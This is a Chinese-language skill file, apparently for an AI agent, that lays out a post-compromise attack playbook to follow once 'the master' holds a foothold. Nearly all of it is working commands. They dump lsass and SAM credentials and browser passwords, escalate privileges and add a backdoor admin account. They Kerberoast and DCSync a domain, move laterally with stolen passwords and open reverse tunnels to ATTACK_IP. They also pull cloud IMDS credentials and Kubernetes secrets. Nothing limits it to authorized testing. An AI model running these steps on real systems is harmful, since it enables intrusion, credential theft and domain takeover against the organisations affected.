---
name: m-net
description: "内网与域：落点侦察、凭据、提权、Kerberoasting、横向、隧道、云与 K8s。"
---

# m-net · 内网 / 域 / 云 / 提权

被读到时：主人已经有一个落点，要横向、提权、拿域控、打云、建隧道。

## 一、落点后十分钟

```bash
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all
net user && net localgroup administrators
netstat -ano | findstr LISTEN
tasklist /svc
wmic product get name,version        # 装了什么
cmdkey /list                          # 存的凭据
dir /a %USERPROFILE%\.ssh %USERPROFILE%\.aws
```

Linux 侧：

```bash
id; sudo -l; uname -a; cat /etc/os-release
ss -tlnp; ps auxf; ls -la /home /root /opt /var/www
find / -perm -4000 -type f 2>/dev/null      # SUID
cat /etc/crontab; ls -la /etc/cron.*
env; cat ~/.bash_history; ls -la ~/.ssh
```

## 二、凭据

**Windows**

```bash
# 内存里的凭据
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit
# 或 procdump 出 lsass 再离线
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp
# DPAPI
mimikatz "dpapi::chrome /in:%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
```

**Linux**

```bash
cat /etc/shadow                    # 有 root 时
unshadow passwd shadow > h.txt && hashcat -m 1800 h.txt rockyou.txt
grep -r "password" /var/www /opt 2>/dev/null
```

## 三、提权

**Windows**

```bash
# 一把梭
winPEASx64.exe
# 关键项
whoami /priv                     # SeImpersonate → PrintSpoofer / GodPotato
accesschk.exe -uwcqv "Users" *   # 可写服务
icacls C:\path                   # 目录权限
# 未加引号的服务路径
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
```

`SeImpersonatePrivilege` 直接：

```bash
PrintSpoofer64.exe -i -c "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user h P@ss /add && net localgroup administrators h /add"
```

**Linux**

```bash
sudo -l                    # NOPASSWD 的二进制查 GTFOBins
find / -perm -4000 2>/dev/null
# 常见：vim / find / nmap / python 的 SUID → 直接 !sh 或 -exec
# 内核提权
uname -r  → 搜对应 CVE（DirtyPipe / PwnKit / overlayfs）
```

## 四、域

```bash
# 信息收集
bloodhound-python -u user -p pass -d CORP.LOCAL -ns DC_IP -c All
# Kerberoasting
impacket-GetUserSPNs CORP.LOCAL/user:pass -dc-ip DC_IP -request
hashcat -m 13100 spn.txt rockyou.txt
# AS-REP
impacket-GetNPUsers CORP.LOCAL/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat
# 横向
impacket-psexec CORP.LOCAL/admin:pass@10.0.0.5
impacket-wmiexec CORP.LOCAL/admin:pass@10.0.0.5
crackmapexec smb 10.0.0.0/24 -u user -p pass -x whoami
# 拿域控：DCSync
impacket-secretsdump CORP.LOCAL/admin:pass@DC_IP -just-dc
```

票据：

```bash
# 导出
mimikatz "sekurlsa::tickets /export"
# 传递
mimikatz "kerberos::ptt ticket.kirbi"
Rubeus.exe ptt /ticket:base64
```

## 五、隧道

```bash
# chisel（最通用）
./chisel server -p 8080 --reverse
./chisel client ATTACK_IP:8080 R:socks
# 用 proxychains 走 1080
# ligolo-ng（更快，三层）
./proxy -selfcert
./agent -connect ATTACK_IP:11601 -ignore-cert
# ssh 动态转发
ssh -D 1080 -N -f user@pivot
# 端口转发
ssh -L 3389:10.0.0.5:3389 user@pivot
```

## 六、云 / K8s

```bash
# AWS
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name X
aws s3 ls
# IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# K8s
kubectl auth can-i --list
kubectl get secrets -A
# 容器逃逸方向：privileged / hostPath / docker.sock / cgroup release_agent
ls -la /var/run/docker.sock
capsh --print
```

## 七、验收

- 提权成功 = 新 shell 的 `whoami /priv` 或 `id` 变了；
- 横向成功 = 目标上执行了命令且回显拿到；
- 每一步记录：哪个凭据、哪条命令、什么回显。
